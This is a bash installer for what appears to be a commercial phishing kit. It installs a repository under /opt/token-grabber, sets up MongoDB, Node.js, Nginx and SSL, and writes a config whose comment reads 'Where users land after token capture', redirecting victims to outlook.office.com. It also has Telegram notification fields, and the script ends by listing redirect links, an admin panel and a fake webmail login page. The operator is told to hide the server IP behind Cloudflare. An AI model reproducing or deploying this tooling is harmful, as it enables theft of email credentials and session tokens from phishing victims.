#!/bin/bash

# Self-fix Windows line endings (CRLF → LF) if needed
if file "$0" 2>/dev/null | grep -q CRLF; then
  sed -i 's/\r//' "$0"
  exec bash "$0" "$@"
fi

# ═══════════════════════════════════════════════════════════════
#   One-Command Installer
#   Give this file to your client. They run:  sudo bash install.sh
# ═══════════════════════════════════════════════════════════════

REPO_URL="https://github.com/fingerprint07/oggggjses.git"
INSTALL_DIR="/opt/token-grabber"
APP_DIR="$INSTALL_DIR/client"

set -e
export DEBIAN_FRONTEND=noninteractive

# ── Colors ────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# ── Helpers ───────────────────────────────────────────────────
hr()  { echo -e "${CYAN}  ══════════════════════════════════════════${NC}"; }
hrY() { echo -e "${YELLOW}  ──────────────────────────────────────────${NC}"; }
ok()  { echo -e "  ${GREEN}✓${NC}  $1"; }
info(){ echo -e "  ${CYAN}ℹ${NC}  $1"; }
warn(){ echo -e "  ${YELLOW}⚠${NC}  $1"; }
err() { echo -e "  ${RED}✗${NC}  $1"; }
pause(){ echo ""; read -rp "  Press ENTER to continue…" _; echo ""; }

# ── Root check ────────────────────────────────────────────────
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}  ✗  Run as root:  sudo bash install.sh${NC}"
  exit 1
fi

# ── Get server public IP ───────────────────────────────────────
SERVER_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null \
         || curl -s --max-time 5 https://ifconfig.me 2>/dev/null \
         || hostname -I | awk '{print $1}')

# ══════════════════════════════════════════════════════════════
clear
echo ""
hr
echo -e "${CYAN}  ║  🚀  Full Installer — One Command Setup    ║${NC}"
hr
echo ""
echo -e "  ${DIM}This installer will:${NC}"
echo -e "  ${GREEN}✓${NC} Download the app from GitHub"
echo -e "  ${GREEN}✓${NC} Install Node.js 24, MongoDB 7, Nginx"
echo -e "  ${GREEN}✓${NC} Register the app as a system service"
echo -e "  ${GREEN}✓${NC} Set up your domain with a free SSL certificate"
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 0 — Show VPS IP & get domain
# ══════════════════════════════════════════════════════════════
hrY
echo ""
echo -e "  ${BOLD}📡  Your Server IP Address:${NC}"
echo ""
echo -e "     ${GREEN}${BOLD}  $SERVER_IP  ${NC}"
echo ""
hrY
echo ""
echo -e "  ${BOLD}Before we continue — set up your DNS in Cloudflare:${NC}"
echo ""
echo -e "  ${CYAN}Step 1${NC}  Log in to Cloudflare → select your domain"
echo -e "  ${CYAN}Step 2${NC}  Go to  DNS → Records → Add record"
echo -e "  ${CYAN}Step 3${NC}  Create an ${BOLD}A record${NC}:"
echo -e "         • ${YELLOW}Name${NC}   →  your subdomain  (e.g. ${CYAN}panel${NC})"
echo -e "         • ${YELLOW}IPv4${NC}   →  ${GREEN}$SERVER_IP${NC}"
echo -e "         • ${YELLOW}Proxy${NC}  →  ${RED}☁  OFF (grey cloud)${NC}  ← IMPORTANT!"
echo ""
echo -e "  ${YELLOW}⚠  The proxy MUST be OFF (grey) so Let's Encrypt"
echo -e "     can verify your domain and issue the SSL certificate."
echo -e "     You will turn it ON again after setup is complete.${NC}"
echo ""
pause

echo -e "  ${BOLD}Enter your domain  (e.g. ${CYAN}panel.yourdomain.com${NC}${BOLD}):${NC}"
read -rp "  → " DOMAIN

if [ -z "$DOMAIN" ]; then
  err "Domain cannot be empty."
  exit 1
fi

# Auto-generate email from root domain
ROOT_DOMAIN=$(echo "$DOMAIN" | awk -F'.' '{n=NF; if(n>=2) print $(n-1)"."$n; else print $0}')
EMAIL="admin@${ROOT_DOMAIN}"

echo ""
ok "Domain : ${CYAN}$DOMAIN${NC}"
ok "Email  : ${CYAN}$EMAIL${NC}  (used for SSL certificate — auto-generated)"
echo ""
hrY
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 1 — System update + install git
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [1/7]  Updating system & installing git…${NC}"
apt-get update -qq
apt-get install -y -qq git
ok "System updated & git installed"
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 2 — Node.js 24
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [2/7]  Installing Node.js 24…${NC}"
if command -v node &>/dev/null; then
  ok "Node.js already installed  ($(node -v))"
else
  curl -fsSL https://deb.nodesource.com/setup_24.x | bash - &>/dev/null
  apt-get install -y -qq nodejs
  ok "Node.js $(node -v) installed"
fi
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 3 — MongoDB 7
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [3/7]  Installing MongoDB 7.0…${NC}"
if command -v mongod &>/dev/null; then
  ok "MongoDB already installed"
else
  apt-get install -y -qq gnupg curl
  curl -fsSL https://www.mongodb.org/static/pgp/server-7.0.asc \
    | gpg --dearmor -o /usr/share/keyrings/mongodb-server-7.0.gpg 2>/dev/null
  echo "deb [ signed-by=/usr/share/keyrings/mongodb-server-7.0.gpg ] \
https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/7.0 multiverse" \
    > /etc/apt/sources.list.d/mongodb-org-7.0.list
  apt-get update -qq
  apt-get install -y -qq mongodb-org
  ok "MongoDB installed"
fi
systemctl start mongod  2>/dev/null || true
systemctl enable mongod 2>/dev/null || true
ok "MongoDB running"
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 4 — Clone app from GitHub
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [4/7]  Downloading app from GitHub…${NC}"
if [ -d "$INSTALL_DIR/.git" ]; then
  git -C "$INSTALL_DIR" pull --quiet
  ok "App updated from GitHub"
else
  rm -rf "$INSTALL_DIR"
  git clone --quiet "$REPO_URL" "$INSTALL_DIR"
  ok "App downloaded  →  ${CYAN}$APP_DIR${NC}"
fi
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 5 — npm dependencies
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [5/7]  Installing app dependencies…${NC}"
cd "$APP_DIR"
npm install --production --silent
ok "Dependencies installed"
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 6 — Create config.js
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [6/7]  Setting up config.js…${NC}"
if [ ! -f "$APP_DIR/config.js" ]; then
  cat > "$APP_DIR/config.js" <<'EOF'
// ─────────────────────────────────────────────────────────────
//  Configuration  —  edit these values, then restart the app
// ─────────────────────────────────────────────────────────────
module.exports = {
  // ➤ License key  (activate through admin panel on first visit)
  licenseKey: '',

  // ➤ Server port  (keep 8080 — Nginx sits in front)
  port: 8080,

  // ➤ MongoDB connection
  mongodbUri: 'mongodb://localhost:27017/mail_client',

  // ➤ Telegram notifications  (optional)
  telegramBotToken: '',
  telegramChatId:   '',

  // ➤ Where users land after token capture
  redirectUrl: 'https://outlook.office.com',
};
EOF
  ok "config.js created"
else
  ok "config.js already exists"
fi
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 7 — Systemd service
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [7/7]  Creating systemd service…${NC}"
NODE_BIN=$(which node)
cat > /etc/systemd/system/mail-client.service <<EOF
[Unit]
Description=Mail Client
After=network.target mongod.service

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR
ExecStart=$NODE_BIN src/loader.js
Restart=always
RestartSec=5
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable mail-client
systemctl start mail-client
ok "Service started & enabled (auto-starts on reboot)"
echo ""

# ══════════════════════════════════════════════════════════════
# STEP 8 — Nginx + SSL
# ══════════════════════════════════════════════════════════════
echo -e "${CYAN}  [+]  Setting up Nginx & SSL for ${DOMAIN}…${NC}"

apt-get install -y -qq nginx certbot python3-certbot-nginx

NGINX_CONF="/etc/nginx/sites-available/mail-client"
cat > "$NGINX_CONF" <<EOF
server {
    listen 80;
    server_name $DOMAIN;

    location / {
        proxy_pass          http://localhost:8080;
        proxy_http_version  1.1;
        proxy_set_header    Upgrade \$http_upgrade;
        proxy_set_header    Connection 'upgrade';
        proxy_set_header    Host \$host;
        proxy_set_header    X-Real-IP \$remote_addr;
        proxy_set_header    X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header    X-Forwarded-Proto \$scheme;
        proxy_cache_bypass  \$http_upgrade;
    }
}
EOF

ln -sf "$NGINX_CONF" /etc/nginx/sites-enabled/mail-client
rm -f /etc/nginx/sites-enabled/default
nginx -t
systemctl enable nginx
systemctl restart nginx
ok "Nginx configured"

echo ""
echo -e "  ${YELLOW}⚠  Getting your SSL certificate now…${NC}"
echo -e "  ${DIM}   (This requires your Cloudflare proxy to be OFF/grey right now)${NC}"
echo ""

certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos -m "$EMAIL" --redirect
ok "SSL certificate installed — site is now HTTPS only"

# Save ssl.json
cat > "$APP_DIR/ssl.json" <<EOF
{
  "domain":   "$DOMAIN",
  "certPath": "/etc/letsencrypt/live/$DOMAIN/fullchain.pem",
  "keyPath":  "/etc/letsencrypt/live/$DOMAIN/privkey.pem"
}
EOF

# Auto-renewal hook
mkdir -p /etc/letsencrypt/renewal-hooks/post
cat > /etc/letsencrypt/renewal-hooks/post/reload-nginx.sh <<'EOF'
#!/bin/bash
systemctl reload nginx 2>/dev/null || true
EOF
chmod +x /etc/letsencrypt/renewal-hooks/post/reload-nginx.sh

systemctl restart mail-client 2>/dev/null || true

# ══════════════════════════════════════════════════════════════
# DONE — Final instructions
# ══════════════════════════════════════════════════════════════
echo ""
hr
echo -e "${GREEN}  ║       ✅  Installation Complete!           ║${NC}"
hr
echo ""

echo -e "  ${BOLD}🔗  Your URLs:${NC}"
echo ""
echo -e "     ${YELLOW}Redirect links${NC}  →  ${GREEN}https://$DOMAIN/[link-id]${NC}"
echo -e "     ${YELLOW}Admin panel${NC}     →  ${GREEN}https://$DOMAIN/admin${NC}"
echo -e "     ${YELLOW}Webmail login${NC}   →  ${GREEN}https://$DOMAIN/mailbox-login.html${NC}"
echo ""
hrY
echo ""
echo -e "  ${BOLD}📋  What to do next:${NC}"
echo ""
echo -e "  ${CYAN}Step 1${NC}  ${BOLD}Turn ON Cloudflare proxy (orange cloud ☁)${NC}"
echo -e "         Go to Cloudflare → DNS → your ${BOLD}$DOMAIN${NC} A-record"
echo -e "         Click the grey cloud → it should turn ${YELLOW}orange${NC}"
echo -e "         This hides your server IP and adds Cloudflare protection"
echo ""
echo -e "  ${CYAN}Step 2${NC}  Open the admin panel:"
echo -e "         ${GREEN}https://$DOMAIN/admin${NC}"
echo -e "         Enter your license key to activate"
echo -e "         Set an admin password"
echo ""
echo -e "  ${CYAN}Step 3${NC}  Edit ${CYAN}$APP_DIR/config.js${NC}  to add:"
echo -e "         • Telegram bot token  (for notifications)"
echo -e "         • MongoDB URI         (default is fine)"
echo -e "         Then run:  ${CYAN}sudo systemctl restart mail-client${NC}"
echo ""
hrY
echo ""
echo -e "  ${BOLD}🔧  Useful commands:${NC}"
echo -e "     App logs:    ${CYAN}sudo journalctl -u mail-client -f${NC}"
echo -e "     Restart app: ${CYAN}sudo systemctl restart mail-client${NC}"
echo -e "     Nginx logs:  ${CYAN}sudo tail -f /var/log/nginx/error.log${NC}"
echo -e "     SSL test:    ${CYAN}sudo certbot renew --dry-run${NC}"
echo ""
